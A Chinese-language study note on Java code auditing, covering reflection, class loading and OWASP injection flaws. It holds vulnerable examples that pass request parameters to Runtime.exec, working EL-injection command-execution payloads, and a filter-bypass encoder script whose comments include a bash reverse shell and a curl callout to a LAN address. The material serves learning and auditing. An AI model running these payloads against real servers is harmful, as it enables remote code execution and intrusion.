# Java CodeAudit
# 0x01 Java EE 基础知识
# 1  java反射机制
```
java反射机制可以无视类方法、变量去访问权限修饰符(如protected、private等)，并且可以调用任何类的任意方法、访问并修改成员变量值。
```
## 1.1 反射的基本运用
### 1.1.1 获取类对象
1. 使用forName()方法:  
```
exp:  
    Class name = Class.forName("java.lang.Runtime");
```
2. 直接获取:  
```
exp:  
    Class<?> name = Runtime.class;
```
3. 使用getClass()方法:  
```
exp:  
    Runtime rt = Runtime.GetRuntime();  
    Class<?> name =rt.getClass();
```
4. 使用getSystemClassLoader().loadClass()方法:  
```
exp:  
    Class<?> name = ClassLoader.getSystemClassLoader().loadClass("java.lang.Runtime");
```
**以上四种example输出的name都为 Class java.lang.Runtime**
### 1.1.2 获取类方法
1. getDeclaredMethods 方法:  
```
getDeclaredMethods方法返回类或接口声明的所有方法，包括public、protected、private和默认方法，但不包括继承的方法。
```
2. getMethods 方法:  
```
getMethods方法返回某个类的所有public方法，包括其继承类的public方法。
```
3. getMethod 方法:  
```
getMethod方法只能返回一个特定的方法，如Runtime类中的exec()方法，该方法的第一个参数为方法名称，后面的参数对应Class的对象。
exp:  
    import java.lang.reflect.Method;

    public class test {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {
            Runtime rt = Runtime.getRuntime();
            Class<?> name = rt.getClass();
            Method method = name.getMethod("exec", String.class);
            System.out.println("getMethod获取的特定方法");
            System.out.println(method);
        }
    }
    输出内容为:
        getMethod获取的特定方法
        public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException
```
4. getDeclaredMethod方法:  
```
该方法与getMethod类似，也只能返回一个特定的方法，该方法的第一个参数为方法名，第二个参数名是方法参数。
```
### 1.1.3 获取类成员变量
1. getDeclaredFields 方法: 
```
getDeclaredFields 方法能够获得类的成员变量数组，包括public、private、proteced，但是不包括父类的声明字段。
```
2. getFields 方法:  
```
getFields 能够获得某个类的所有public字段，包括父类中的字段。
```
3. getDelcaredField 方法:  
```
该方法与getDelcaredFields的区别是只能获得类的单个成员变量。
```
4. getField 方法:  
```
与getFields类似，getField方法能够获得某个类特定的public字段，包括父类中的字段。
```
## 1.2 ClassLoader类加载机制
1. 自定义的类加载器 
``` 
通过重写findClass()方法，利用defineClass()方法来将字节码转换为java.lang.class类对象，就可以实现自定义的类加载器。
```
2. loadClass()方法与 Class.forName 的区别  
```
loadClass()方法只对类进行加载，不会对类进行初始化。  
Class.forName会默认对类进行初始化，当对类进行初始化时，静态的代码块就会得到执行，而代码块和构造函数则需要适合的类实例化才能得到执行。
```
3. URLClassLoader  
```
URLClassLoader类是ClassLoader的一个实现，拥有从远程服务器上加载类的能力。通过URLClassLoader可以实现对一些webshell的远程加载、对某个漏洞的深入利用。
```
## 1.3 Java 动态代理
```
Java 代理的方式有3种：静态代理、动态代理和CGLib代理。
```
# 0x02 OWASP Top 10 漏洞的代码审计
##  1. 注入
### 1.1 SQL注入
1. JDBC拼接不当造成sql注入  
```
JDBC有两种方法执行SQL语句，分别为PrepareStatement和Statement。两个方法的区别在于PrepareStatement会对SQL语句进行预编译，而Statement方法在每次执行时都需要编译。
```
2. 框架使用不当造成SQL注入  
```
(1) MyBatis 框架:
    MyBatis中使用 parameterType 向 SQL 语句传参，在SQL引用传参可以使用 #{Parameter} 和 ${Parameter} 两种方式。
    #{Parameter} 采用预编译的方式构造 SQL。
    ${Parameter} 采用拼接的方式构造 SQl。
(2) Hibernate 框架:
    也是分为预编译和直接拼接两种。
```
### 1.2 命令注入
```
系统命令支持使用连接符来执行多条语句，常见的连接符有"|"、"||"、"&"、"&&"。对于JAVA环境中的命令注入，连接符的使用存在一些局限。
利用条件:
    1.若命令参数完全可控，可以注入任意命令执行（ProcessBuilder只能执行无参命令）
    exp:
        String command = request.getParameter("command");
        Process process = Runtime.getRuntime().exec(command);
    2.不存在创建shell，无法结合;、&&等特殊符号进行命令注入
    3.存在创建shell
        存在参数注入，可以进行命令注入（例如可控点在-c传入的参数命令后）
    exp:
        String filename = request.getParameter("filename");
        Process process = Runtime.getRuntime().exec("sh -c ./shell/"+filename);
```
**ProcessBuilder()和Runtime.getRuntime.exec()本质上一样**
### 1.3 代码注入
```
代码注入一般由Java反射实现。    notes:更多详细内容牵扯到反序列化和反射，后面再去详细学习分析链，例如apache-commons-colletions-3.1。
```
### 1.4 表达式注入
1. EL 表达式的基础  
```
EL 表达式的主要功能如下:
1)获取数据：EL表达式可以从JSP的四大作用域（page、request、session、application）中获取数据。
    exp：
        <c:set value="aaa" var="test1" scope="page" />  变量test1只在当前jsp有效
        <c:set value="aaa" var="test2" scope="request" />  变量test2只在一次请求中有效
        <c:set value="aaa" var="test3" scope="session" />  变量test3在一次会话中有效，但仅供单个用户使用，会话退出后则失效。
        <c:set value="aaa" var="test4" scope="application"/>  变量test4在整个服务器中有效，全部用户共享，会话退出后仍有效。
2)执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。
3)获取Web开发常用对象：EL表达式内置了11个隐式对象，开发者可以通过这类隐式对象获得想要的数据。
    (11个隐式对象为：pageScope,requestScope,sessionScope,aoolicatonScope,param,paramValues,header,headerValues,initParam,cookie,pageContext)
4)调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。
    exp:
        ${ELFunc:doSomething("param")} 直接在EL表达式中使用 类名:方法名() 的形式来调用该类方法即可
```
2. EL 基础语法  
```
语法格式：${}
例如 ${name} 表示获取“name”变量。当EL表达式未指定作用域范围时，默认在page作用域范围查找，而后一次在request、session、application范围查找。
也可以直接指定某个作用域 例如${requestScope.name}。
```
3. 获取对象属性  
```
获取对象属性的方式有两种：
1) ${对象.属性}，例如 ${param.name}
2) ${param[name]} ,当属性名中存在特殊字符或属性名是一个变量时，则需要使用这个方式，例如 ${User["Login-Flag"]} 
```
4. JSP中启动/禁用EL表达式
```
1) 全局禁用EL表达式
web.xml中进入如下配置：
    <jsp-config>
        <jsp-property-group>
            <url-pattern>*.jsp</url-pattern>
            <el-ignored>true</el-ignored>
        </jsp-property-group>
    </jsp-config>
2) 单个文件禁用EL表达式
在JSP文件中可以有如下定义：
    <%@ page isELIgnored="true" %>  TRUE表示禁止，FALSE表示不禁止。
```
5. EL注入 代码审计的函数点
```
光有一个${param.name}是没办法实现RCE的，必须配合后端表达式解析器。高危函数比如：PageContextImpl.proprietaryEvaluate、javax.el.ExpressionFactory.createValueExpression...
exp1(CVE-2011-2730):
    ${param.a}这个EL表达式，其实是被转化成了这样的代码 org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate("${param.a}", .......)。
exp2(CVE-2018-1273):
    参数解析使用了Spring-Data-Commons依赖包中的ProxyingHandlerMethodArgumentResolver解析导致。最后调用了StanderdEvaluationContext接口解析了SPEL表达式。
exp3(本地环境测试):
    <%@ page import="org.apache.jasper.runtime.PageContextImpl" %>
    <%
        String res = (String) PageContextImpl.proprietaryEvaluate(request.getParameter("code"), String.class, pageContext, null);
        out.print(res);
    %>
exp4:
    javax.el.ExpressionFactory.createValueExpression()
    javax.el.ValueExpression.getValue()

    Java代码如下:
    import de.odysseus.el.ExpressionFactoryImpl;
    import de.odysseus.el.util.SimpleContext;
    import Javax.el.*;
    public class Main {
        public static void main(String[] args) {
            ExpressionFactory factory = new ExpressionFactoryImpl();
            SimpleContext context = new SimpleContext();
            String pl = "ABC ${true.toString().toUpperCase()}";
            ValueExpression e = factory.createValueExpression(context, pl, String.class);
            System.out.println(e.getValue(context));
        }
    }
```
6. EL表达式注入 通用POC
```
1) 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

2) 获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

3) 文件头参数
${header}

4) 获取webRoot
${applicationScope}

5) 无回显命令执行
样例如下:
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}   -- 本地测试没有成功

${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"ping -c 10 aaa.a69f813b.dns.1433.eu.org")}

${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"open -a Calculator.app"))}
或者是借助js引擎:
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("new+java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")}

${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator.app')")}

6) 有回显执行命令
${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd /c dir").getInputStream());Thread.sleep(1000);pageContext.setAttribute("inputStreamAvailable", pageContext.getAttribute("inputStream").available());pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"));pageContext.setAttribute("allocateMethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", Integer.TYPE));pageContext.setAttribute("heapByteBuffer", pageContext.getAttribute("allocateMethod").invoke(null, pageContext.getAttribute("inputStreamAvailable")));pageContext.getAttribute("inputStream").read(pageContext.getAttribute("heapByteBuffer").array(), 0, pageContext.getAttribute("inputStreamAvailable"));pageContext.setAttribute("byteArrType", pageContext.getAttribute("heapByteBuffer").array().getClass());pageContext.setAttribute("stringClass", Class.forName("java.lang.String"));pageContext.setAttribute("stringConstructor", pageContext.getAttribute("stringClass").getConstructor(pageContext.getAttribute("byteArrType")));pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructor").newInstance(pageContext.getAttribute("heapByteBuffer").array()));pageContext.getAttribute("stringRes")}
借助js引擎:
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var s = [3];s[0] = \"cmd\";s[1] = \"/c\";s[2] = \"whoami\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");var result = sc.hasNext() ? sc.next() : \"\";sc.close();result;")}
```
7. EL表达式注入的绕过  
通过下面这段 EL，能够获取字符 C 则同理可以获取任意字符串  
```
${true.toString().charAt(0).toChars(67)[0].toString()}
```
利用以上原理，通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤  
生成 paylaod 脚本:  
```
#coding: utf-8

#payload = "bash$IFS-i$IFS>&$IFS/dev/tcp/192.168.169.112/7777$IFS0>&1"
#payload = "bash$IFS-c$IFS'curl 192.168.169.112:7777'"
#exp = '${pageContext.setAttribute("%s","".getClass().forName("%s").getMethod("%s","".getClass()).invoke("".getClass().forName("%s").getMethod("%s").invoke(null),"%s"))}' % ('a','java.lang.Runtime','exec','java.lang.Runtime','getRuntime','open -a Calculator.app')

def encode(payload):
	encode_payload = ""
	for i in range(0, len(payload)):
		if i == 0:
			encode_payload += "true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0])
		else:
			encode_payload += ".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i])
	return encode_payload

exp = '${pageContext.setAttribute(%s,"".getClass().forName(%s).getMethod(%s,"".getClass()).invoke("".getClass().forName(%s).getMethod(%s).invoke(null),%s))}' % (encode('a'),encode('java.lang.Runtime'),encode('exec'),encode('java.lang.Runtime'),encode('getRuntime'),encode('open -a Calculator.app'))

print(exp)
```
8. 参考链接
```
https://xz.aliyun.com/t/7692#toc-13
https://yzddmr6.com/posts/java-expression-exploit/
https://j0k3r.top/2020/08/13/java-expression/#0x04-EL-%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1
https://threedr3am.github.io/2019/03/24/Spring-Data-Commons%20CVE-2018-1273%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
```
